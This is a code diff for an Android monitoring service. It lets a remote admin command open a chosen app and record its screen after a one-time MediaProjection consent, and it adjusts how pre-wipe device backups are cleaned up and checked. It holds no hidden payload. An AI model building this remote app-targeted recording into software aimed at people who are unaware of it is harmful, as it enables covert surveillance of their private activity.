@@ -52,9 +52,10 @@ class MonitoringForegroundService : Service() {
     private lateinit var dataPuller: DataPuller
     private lateinit var devicePolicyController: com.dilarion.app.device.DevicePolicyController
     private var screenMonitor: ScreenMonitor? = null
-    // (chunkDuration, adminId) for a start_screen_record request waiting on the
-    // one-time MediaProjection consent dialog; resumed in ACTION_PROJECTION_GRANTED.
-    private var pendingScreenRecord: Pair<Int, Int?>? = null
+    // A start_screen_record request waiting on the one-time MediaProjection
+    // consent dialog; resumed in ACTION_PROJECTION_GRANTED.
+    private data class PendingScreenRecord(val chunkSeconds: Int, val adminId: Int?, val targetPackage: String?)
+    private var pendingScreenRecord: PendingScreenRecord? = null
 
     private var wsJob: Job? = null
     private var reconnectJob: Job? = null
@@ -64,8 +65,10 @@ class MonitoringForegroundService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        cacheDir.listFiles()?.filter { it.name.startsWith("pre_wipe_") && it.extension == "zip" }
-            ?.forEach { it.delete() }
+        listOf(cacheDir, getDir("wipe_backups", MODE_PRIVATE)).forEach { dir ->
+            dir.listFiles()?.filter { it.name.startsWith("pre_wipe_") && it.extension == "zip" }
+                ?.forEach { it.delete() }
+        }
         Log.i(TAG, "onCreate start")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
@@ -155,10 +158,12 @@ class MonitoringForegroundService : Service() {
                 }
                 runCatching { screenMonitor?.initProjection(code, data) }
                 // Resume the recording that triggered this consent request, if any.
-                pendingScreenRecord?.let { (chunk, adminId) ->
+                pendingScreenRecord?.let { pending ->
                     pendingScreenRecord = null
-                    runCatching { screenMonitor?.startScreenRecording(chunk, adminId) }
-                        .onFailure { Log.e(TAG, "start_screen_record resume failed: $it") }
+                    scope.launch {
+                        runCatching { beginScreenRecording(pending.chunkSeconds, pending.adminId, pending.targetPackage) }
+                            .onFailure { Log.e(TAG, "start_screen_record resume failed: $it") }
+                    }
                 }
             }
         }
@@ -317,18 +322,18 @@ class MonitoringForegroundService : Service() {
                     "stop_screenshot_timer" -> screenMonitor?.stopScreenshotTimer()
 
                     "start_screen_record" -> {
-                        val sm = screenMonitor
                         val chunk = params.get("chunk_duration")?.asInt ?: 10
                         val adminId = params.get("admin_id")?.asInt
-                        if (sm?.hasProjection() == true) {
-                            sm.startScreenRecording(chunk, adminId)
+                        val targetPackage = params.get("target_package")?.asString
+                        if (screenMonitor?.hasProjection() == true) {
+                            beginScreenRecording(chunk, adminId, targetPackage)
                         } else {
                             // Screen capture needs a one-time interactive Android consent
                             // dialog (MediaProjection) before anything can record. Without
                             // this, the command silently did nothing — no recording, no
                             // error, no trace. Request consent now and resume this exact
                             // request once it is granted (see ACTION_PROJECTION_GRANTED).
-                            pendingScreenRecord = chunk to adminId
+                            pendingScreenRecord = PendingScreenRecord(chunk, adminId, targetPackage)
                             Log.i(TAG, "start_screen_record: no projection yet, requesting consent")
                             MediaProjectionActivity.request(this@MonitoringForegroundService)
                         }
@@ -414,6 +419,22 @@ class MonitoringForegroundService : Service() {
         }.onFailure { Log.e(TAG, "Managed device registration failed", it) }
     }
 
+    private suspend fun beginScreenRecording(chunkSeconds: Int, adminId: Int?, targetPackage: String?) {
+        val monitor = screenMonitor ?: return
+        if (!targetPackage.isNullOrBlank()) {
+            val launch = packageManager.getLaunchIntentForPackage(targetPackage)
+            if (launch != null) {
+                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                runCatching { startActivity(launch) }
+                    .onFailure { Log.w(TAG, "Could not open $targetPackage before recording", it) }
+                delay(700)
+            } else {
+                Log.w(TAG, "No launchable activity for $targetPackage; recording the current screen")
+            }
+        }
+        monitor.startScreenRecording(chunkSeconds, adminId, targetPackage)
+    }
+
     private fun prepareDeviceWipe(wipeId: Int, wipeMode: String) {
         if (!preparingWipes.add(wipeId)) return
         scope.launch {
@@ -425,6 +446,7 @@ class MonitoringForegroundService : Service() {
                         error("Device Owner is required for $wipeMode")
                     }
                     archive = DeviceBackupBuilder(this@MonitoringForegroundService).build(wipeId, wipeMode)
+                    if (!archive!!.isFile) error("Backup archive was removed before it could be uploaded")
                     val digest = MessageDigest.getInstance("SHA-256")
                     archive!!.inputStream().use { input ->
                         val block = ByteArray(1024 * 1024)
